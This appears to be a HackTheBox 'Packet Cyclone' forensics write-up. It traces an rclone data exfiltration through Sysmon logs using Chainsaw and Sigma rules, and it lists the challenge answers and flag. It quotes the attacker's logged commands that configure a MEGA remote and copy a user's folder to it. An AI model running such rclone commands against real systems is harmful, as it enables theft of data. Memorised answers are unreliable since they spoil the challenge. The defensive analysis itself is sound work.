<img width="704" height="642" alt="image" src="https://github.com/user-attachments/assets/0bc6b528-c5b3-4407-b2a3-218d47577993" />

# HTB Forensics Challenge: **Packet Cyclone** – Write-up
Challenge Summary:

Wade’s machine appears to have been compromised. After noticing suspicious traffic, it was suspected that an attacker used **rclone** to exfiltrate sensitive research data. Using **Sysmon logs**, the **Chainsaw** tool, and provided **Sigma rules.**

## Tools Used:

- **Chainsaw**: For log hunting with Sigma rules
- **Sigma Rules**: Detection rules for `rclone` execution and configuration
- **Sysmon Logs**: `Microsoft-Windows-Sysmon%4Operational.evtx`

---

## File Preparation

After unzipping the challenge files:

```bash
unzip Packet\ Cyclone.zip
```

<img width="1370" height="616" alt="image" src="https://github.com/user-attachments/assets/fca06fb6-7421-44a9-9381-722396f6fb17" />

<img width="1376" height="164" alt="image" src="https://github.com/user-attachments/assets/c96f1a58-5d51-4ea7-ab9e-303bfcc1de48" />

We noted:

- Logs were extracted to: `~/Desktop/htb/Logs/`
- Sigma rules were in: `~/Desktop/htb/sigma_rules/`

## Step 1: Detect Rclone Activity with Chainsaw

We used the `chainsaw hunt` command with the Sigma rules and Sysmon logs:

```bash
chainsaw hunt ../Logs/Microsoft-Windows-Sysmon%4Operational.evtx \
  -s ../sigma_rules/ \
  --mapping mappings/sigma-event-logs-all.yml \
  -r rules/ \
  -o output/hunt_results.json
```

<img width="1376" height="387" alt="image" src="https://github.com/user-attachments/assets/3c21c5ed-1163-4c07-984b-8ffd841ff5f2" />

**Explanation:**

- `hunt` – tells Chainsaw to detect threats
- `s ../sigma_rules/` – points to the Sigma rules
- `-mapping` – maps event fields to Sigma format
- `o output/hunt_results.json` – outputs results to a JSON file

Chainsaw reported:

```
[+] 2 Detections found on 2 documents
```

This confirmed **rclone was detected** via Sigma rules.

## Step 2: Analyze Findings in Hunt Results

We inspected the results:

```bash
grep -i -C 5 "rclone" output/hunt_results.json
```

<img width="1649" height="797" alt="image" src="https://github.com/user-attachments/assets/cd4c254e-28ce-4a82-85e1-0d0c77213dca" />

> *What is the email of the attacker used for the exfiltration process? (for example: [name@email.com](mailto:name@email.com))*
> 

<img width="631" height="133" alt="image" src="https://github.com/user-attachments/assets/16c9cb07-5a38-4603-b5c2-1f09f517a404" />

### Evidence:

From the `rclone config` command:

```
rclone.exe" config create remote mega user majmeret@protonmail.com pass ...
```

> *What is the password of the attacker used for the exfiltration process?*
> 

<img width="360" height="116" alt="image" src="https://github.com/user-attachments/assets/83ca1f11-aab5-4033-bd82-5c0a375e6989" />

**Answer:** `FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI`

> *What is the Cloud storage provider used by the attacker? (for example: cloud)*
> 

<img width="364" height="184" alt="image" src="https://github.com/user-attachments/assets/8bef98bc-eafb-4af0-a8b8-d6efaa8bf721" />

### Evidence:

Seen in the `rclone config create` command:

```
config create remote mega user ...
```

**Answer:** `mega`

> *What is the ID of the process used by the attackers to configure their tool? (for example: 1337)*
> 

<img width="363" height="311" alt="image" src="https://github.com/user-attachments/assets/357140e6-9487-4672-92d6-c345c7ef5daf" />

Immediately after the `config create` command in logs:

```
ProcessId: 3820
```

**Answer:** `3820`

> *What is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\Users\user\folder)*
> 

<img width="413" height="163" alt="image" src="https://github.com/user-attachments/assets/fbb45455-a592-4a18-b36d-1f543634846d" />

Seen in the rclone `copy` command:

```
rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
```

**Answer:** `C:\Users\Wade\Desktop\Relic_location`

> *What is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)*
> 

<img width="493" height="114" alt="image" src="https://github.com/user-attachments/assets/d118fedb-0359-4281-82bb-8f91cf45b77f" />

**Answer**: `exfiltration`

## Final Flag:

After answering all questions correctly:

```
HTB{Rcl0n3_1s_n0t_s0_inn0c3nt_4ft3r_4ll}
```

## Key Takeaways:

- **Chainsaw + Sigma + Sysmon** is an extremely effective combo for forensic analysis.
- Rclone activity can be spotted easily through command-line parameters.
- Small syntax differences (like trailing slashes) can affect answer validation — always clean the input!
- Always check both `config` and `copy` actions in rclone to trace the full exfiltration chain.
